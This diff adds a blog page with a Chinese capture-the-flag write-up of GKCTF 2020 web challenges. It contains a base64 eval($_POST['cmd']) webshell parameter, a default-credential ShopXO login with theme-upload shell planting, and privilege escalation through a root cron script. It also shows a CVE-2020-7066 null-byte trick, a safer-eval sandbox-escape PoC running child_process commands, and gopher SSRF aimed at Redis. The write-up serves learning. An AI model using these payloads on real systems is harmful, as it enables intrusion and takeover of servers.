@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebCheck_in题目直接给出源码，发现它base64解码后，可以执行命令。  那我们可以通过get传参Ginkgo&#x3D;ZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x3D;(eval($_POST[‘cmd’]);的base64编码)，然后再POST传参数执行命令。 先看一下phpinfo，因为默认这个题目没有这么简单，就先搜disable_functions，看到禁用了很多函数，那就必须要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GKCTF学习">
+<meta property="og:url" content="https://crownz-sec.github.io/2020/05/26/GKCTF2020/index.html">
+<meta property="og:site_name" content="crownZ&#39;s Blog">
+<meta property="og:description" content="WebCheck_in题目直接给出源码，发现它base64解码后，可以执行命令。  那我们可以通过get传参Ginkgo&#x3D;ZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x3D;(eval($_POST[‘cmd’]);的base64编码)，然后再POST传参数执行命令。 先看一下phpinfo，因为默认这个题目没有这么简单，就先搜disable_functions，看到禁用了很多函数，那就必须要">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526141821.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200527201648.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/image-20200526142516624.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526144440.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526144542.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526144731.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526145204.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526145532.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526150236.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526151056.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526151553.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526151742.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526151928.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526152020.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526152729.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526152851.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526153828.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526154732.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526154847.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526161508.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526163802.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526172852.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526173053.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526192543.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526192655.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526220923.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526224440.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526224822.png">
+<meta property="og:image" content="https://gitee.com/crownz/blog_image/raw/master/20200527204045.png">
+<meta property="article:published_time" content="2020-05-26T07:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-23T06:12:17.426Z">
+<meta property="article:author" content="crownZ">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Nodejs">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/crownz/blog_image/raw/master/20200526141821.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>GKCTF学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/06/07/RACTF2020/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/05/23/Mac_app/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://crownz-sec.github.io/2020/05/26/GKCTF2020/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&text=GKCTF学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&is_video=false&description=GKCTF学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GKCTF学习&body=Check out this article: https://crownz-sec.github.io/2020/05/26/GKCTF2020/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&title=GKCTF学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&name=GKCTF学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://crownz-sec.github.io/2020/05/26/GKCTF2020/&t=GKCTF学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Check-in"><span class="toc-number">1.1.</span> <span class="toc-text">Check_in</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF"><span class="toc-number">1.2.</span> <span class="toc-text">老八小超市儿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE%E7%AD%BE%E5%88%B0"><span class="toc-number">1.3.</span> <span class="toc-text">CVE签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzNode"><span class="toc-number">1.4.</span> <span class="toc-text">EzNode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzWeb"><span class="toc-number">1.5.</span> <span class="toc-text">EzWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzTypecho"><span class="toc-number">1.6.</span> <span class="toc-text">EzTypecho</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Node-Exe"><span class="toc-number">1.7.</span> <span class="toc-text">Node-Exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">1.8.</span> <span class="toc-text">后记</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        GKCTF学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">crownZ</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-26T07:00:00.000Z" itemprop="datePublished">2020-05-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Nodejs/" rel="tag">Nodejs</a>, <a class="tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Check-in"><a href="#Check-in" class="headerlink" title="Check_in"></a>Check_in</h2><p>题目直接给出源码，发现它base64解码后，可以执行命令。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526141821.png"></p>
+<p>那我们可以通过get传参Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs=(eval($_POST[‘cmd’]);的base64编码)，然后再POST传参数执行命令。</p>
+<p>先看一下phpinfo，因为默认这个题目没有这么简单，就先搜disable_functions，看到禁用了很多函数，那就必须要绕过。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200527201648.png"></p>
+<p>先用蚁剑连接，这样可以方便之后操作。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/image-20200526142516624.png"></p>
+<p>因为蚁剑那个bypass的插件还不会用，就利用上传功能上传exp了，<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">传送门</a>。把pwn里面的命令改为/readflag，上传。上传时，需要找一个能上传有权限的文件夹，我这里是/var/tmp，直接右键上传弄好的exp。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526144440.png"></p>
+<p>然后再到主界面，包含一下这个代码，就得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526144542.png"></p>
+<h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>看到是一个ShopXO的商城系统，考这种题，应该不会说是让你从头审计一下这个网站的漏洞在哪里，或者说就是扫路径，然后用渗透测试的思路来做。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526144731.png"></p>
+<p>题目应该有它已经发布的漏洞点，上网去找一下ShopXO漏洞，就找到一个getshell的<a target="_blank" rel="noopener" href="http://www.nctry.com/1660.html">文章</a>，照他的来做。</p>
+<p>默认后台路径为admin.php，弱口令admin+shopxo登入后台。进入“应用中心”—“应用商店”，找到主题下载页面，选择默认主题下载。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526145204.png"></p>
+<p>把shell放到主题压缩包的default/_static_路径下面，注意一定是在不解压的情况下放入shell文件，先解压再压缩，好像会出错。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526145532.png"></p>
+<p>然后进入“网站管理”—“主题管理”—“主题安装”，选择前面的压缩包上传。安装成功后，访问网站/public/static/index/default/cmd.php路径，就可以执行命令。在hackbar执行有点问题，换到了蚁剑，cat /flag发现是个假的，真正的在/root下，但此时是没有权限的。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526150236.png"></p>
+<p>我刚开还想用特殊权限位提权，发现试了几个常用的，都不行。然后在根目录发现一个每60s执行一次的sh脚本，而且它还有root权限。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526151056.png"></p>
+<p>到/var/mail/makeflaghint.py看一下，是一个写文件的脚本，那我们直接在此之上修改一下，加两行读flag的代码。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526151553.png"></p>
+<p>保存之后等待60s，就可以在/flag.hint得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526151742.png"></p>
+<h2 id="CVE签到"><a href="#CVE签到" class="headerlink" title="CVE签到"></a>CVE签到</h2><p>这道题目好久都没人做出来的，然后放出hint，直接提示CVE，那就真就变签到了，但当时还是没怎么看，没做出来。</p>
+<p>页面直接给一个超链接。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526151928.png"></p>
+<p>点击后，会在网址后面拼接一个url，get传参。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526152020.png"></p>
+<p>但这样就不明所以，不知道要看什么。直接搜给出的编号：cve-2020-7066，描述如下：</p>
+<blockquote>
+<p>在 PHP 版本 7.2.x 低于 7.2.29、7.3.x 低于 7.3.16 和 7.4.x 低于 7.4.4，当使用 get_headers（） 处理用户提供的 URL，如果 URL 包含零 （\0） 字符，则 URL 将被默默截断。这可能会导致某些软件对get_headers（）的目标做出不正确的假设，并可能将一些信息发送到错误的服务器。</p>
+</blockquote>
+<p>零字符url编码为%00，通过%00截断，让它请求本地主机，可以得到提示。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526152729.png"></p>
+<p>把host结尾改为123，得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526152851.png"></p>
+<h2 id="EzNode"><a href="#EzNode" class="headerlink" title="EzNode"></a>EzNode</h2><p>主页是一个计算器，但没什么用，直接查看他给的源代码。发现是nodejs写的，需要学习一波相关知识，把一些点都标上去了。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);<span class="comment">//路由和中间件 Web 框架</span></span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);<span class="comment">//HTTP请求体解析中间件，使用这个模块可以解析JSON、Raw、文本、URL-encoded格式的请求体</span></span><br><span class="line"><span class="comment">//safer-eval会把传入的字符串当作js代码执行，safer也不safe，应该避免使用这个东西</span></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&#x27;safer-eval&#x27;</span>); <span class="comment">// 2019.7/WORKER1 找到一个很棒的库</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);<span class="comment">//fs模块提供了用于与文件系统进行交互的API。</span></span><br><span class="line"><span class="keyword">const</span> app = express();<span class="comment">//获取express对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;)); <span class="comment">//解析form表单提交的数据</span></span><br><span class="line">app.use(bodyParser.json());<span class="comment">//解析json数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line"><span class="comment">//req:请求，res:响应，next:下一个中间件函数</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123; <span class="comment">//通用中间件，传入的东西都先进入app.use函数检测,之后才是其他中间件函数</span></span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;<span class="comment">//请求路径 /eval</span></span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;<span class="comment">//req.query.delay获取请求参数delay，可以get,post等方式提交</span></span><br><span class="line">        delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay)); <span class="comment">//取最大</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);<span class="comment">//计时器标识符,如果在delay时间内没执行完毕，后面可通过函数返回的id取消这个计时器</span></span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;<span class="comment">//必须让前面的定时器立马执行结束，不然这个setTimeout会结束上面的定时器</span></span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);<span class="comment">//取消由setTimeout()方法设置的定时操作</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);  <span class="comment">//1000ms的延时</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();<span class="comment">//next函数主要负责将控制权交给下一个中间件函数</span></span><br><span class="line">      <span class="comment">//如果我们的首先传入的路径不是/eval，是/version，if判断分支，执行next()</span></span><br><span class="line">      <span class="comment">//那么next()它就向下交付,找到一个路径符合的路由，</span></span><br><span class="line">      <span class="comment">///eval，/source都不符合，那就不会执行他们</span></span><br><span class="line">      <span class="comment">//直到/version符合，执行/version的代码。</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;<span class="comment">//前面为路由，后面处理方法</span></span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;<span class="comment">//获取http请求中参数e的内容，</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;  </span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></span><br><span class="line">app.get(<span class="string">&#x27;/version&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123; <span class="comment">//主页</span></span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>代码审计后，知道关键点是saferEval这个函数，它可以把我们传入的字符串当作命令执行。那就先看怎么到达这个函数。</p>
+<blockquote>
+<p>在express这个框架中，我们提交的请求都首先会经过第一个app.use函数的处理，如果它处理完毕，并返回给客户端信息。如果此时还没有执行next()函数，那么后面其他中间件函数，如app.post(‘/eval’)就不会得到执行。</p>
+</blockquote>
+<p>要利用saferEval，我们要访问路径/eval。我们传入的请求会先经过app.use函数的处理，它判断路径为/eval之后，就会设置一个60s的delay。同时还会把这个数和我们传入的delay做一个比较，取最大的数为delay，并传给setTimeout设置定时器。如果延时结束，就会执行next()，交给下一个中间件函数处理请求。但代码中又写了一个定时器，在延时1s后，取消之前设置的定时器，并返回给客户端处理结果。因为delay那个数比较大，看起来总是会被取消。这里是一个绕过：</p>
+<blockquote>
+<p>对于setTimeout函数，当delay大于2147483647或小于1时，delay将会被设置为1。非整数的delay会被截断为整数。</p>
+</blockquote>
+<p>我们传入delay=21474836477（只要比上面那个数大就行），这个值大于代码中的delay，取最大。之后，delay就会被setTimeout函数处理为1，1ms马上延时结束，执行next()，提交给下一个中间件函数app.post(‘/eval’)。app.post(‘/eval’)这个路由会对我们把请求中e的值传给safeEval处理，下来就针对safeEval进行沙箱逃逸。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/commenthol/safer-eval/issues/10">传送门</a>给出的Poc：</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&quot;./src/index&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">&quot;return process;&quot;</span>)();</span><br><span class="line">  <span class="keyword">return</span> process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure>
+
+<p>把上面函数中的exp简单拼接一下，再和delay一起传入，就可以得到flag。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526153828.png"></p>
+<p>沙箱逃逸这个知识点要放到以后的深入学习日程中。</p>
+<h2 id="EzWeb"><a href="#EzWeb" class="headerlink" title="EzWeb"></a>EzWeb</h2><p>前端是一个提交网址的页面，没什么信息，查看源代码，提示?secret。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526154732.png"></p>
+<p>因为网址是get提交的，所以它加了问号。尝试一下，看到给了ip地址。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526154847.png"></p>
+<p>ip地址为173.239.227.10，可以通过bp来扫一下这个网段还有什么其他主机。看到5，6，7，10，11是其他主机。但5，6，7页面显示的东西都不知道是干什么的，11提示需要试试其他服务，端口就在这上面，那扫一下它的端口。从一个ip到另一个ip，可以想到ssrf；再到另一个ip的端口，可以认为是redis或者mysql。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526161508.png"></p>
+<p>因为buu这个限制扫描缘故，最多开2线程扫，最后看到6379是开的。看报错是redis的格式，记下了。那么基本可以确认是gopher协议利用ssrf打redis未授权getshell了。</p>
+<p><img src="https://gitee.com/crownz/blog_image/raw/master/20200526163802.png"></p>
+<p>因为它ban了file，不能读文件，但是gopher没有ban，可以利用gopher://协议写shell。写shell的脚本来自<a href="%5Bhttps://byqiyou.github.io/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/%5D(https://byqiyou.github.io/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/)">博客</a>，改成py3并修改ip如下：</p>
